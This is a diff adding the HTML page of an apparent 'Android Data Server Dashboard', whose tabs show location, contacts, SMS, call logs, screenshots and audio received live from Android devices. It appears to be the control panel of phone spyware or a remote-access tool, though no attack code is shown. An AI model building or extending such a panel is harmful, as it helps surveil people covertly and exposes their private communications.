@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Android Data Server Dashboard</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <header>
+    <h1>📡 Android Data Server Dashboard</h1>
+    <div class="header-controls">
+      <label for="device-select">Device:</label>
+      <select id="device-select"><option value="">All Devices</option></select>
+      <button id="theme-toggle">🌙 Dark Mode</button>
+    </div>
+    <div id="device-info" class="device-info"></div>
+    <p>Live data received from Android apps</p>
+  </header>
+  <nav>
+    <ul class="tabs">
+      <li class="tab active" data-tab="location">Location</li>
+      <li class="tab" data-tab="contacts">Contacts</li>
+      <li class="tab" data-tab="sms">SMS</li>
+      <li class="tab" data-tab="calllog">Call Logs</li>
+      <li class="tab" data-tab="screenshot">Screenshots</li>
+      <li class="tab" data-tab="audio">Audio</li>
+      <li class="tab" data-tab="allData">All Data</li>
+    </ul>
+  </nav>
+  <main>
+    <section id="location" class="tab-section active">
+      <h2>Location</h2>
+      <div class="table-container"><table><thead><tr id="location-header"></tr></thead><tbody id="location-body"></tbody></table></div>
+    </section>
+    <section id="contacts" class="tab-section">
+      <h2>Contacts</h2>
+      <div class="table-container"><table><thead><tr id="contacts-header"></tr></thead><tbody id="contacts-body"></tbody></table></div>
+    </section>
+    <section id="sms" class="tab-section">
+      <h2>SMS</h2>
+      <div class="table-container"><table><thead><tr id="sms-header"></tr></thead><tbody id="sms-body"></tbody></table></div>
+    </section>
+    <section id="calllog" class="tab-section">
+      <h2>Call Logs</h2>
+      <div class="table-container"><table><thead><tr id="calllog-header"></tr></thead><tbody id="calllog-body"></tbody></table></div>
+    </section>
+    <section id="screenshot" class="tab-section">
+      <h2>Screenshots</h2>
+      <div class="screenshot-list" id="screenshot-list"></div>
+    </section>
+    <section id="audio" class="tab-section">
+      <h2>Audio</h2>
+      <div class="audio-list" id="audio-list"></div>
+    </section>
+    <section id="allData" class="tab-section">
+      <h2>All Data</h2>
+      <div class="table-container"><table><thead><tr id="allData-header"></tr></thead><tbody id="allData-body"></tbody></table></div>
+    </section>
+  </main>
+  <footer>
+    <p>Server running. Waiting for data...</p>
+  </footer>
+  <script src="/socket.io/socket.io.js"></script>
+  <script src="script.js"></script>
+</body>
+</html> 
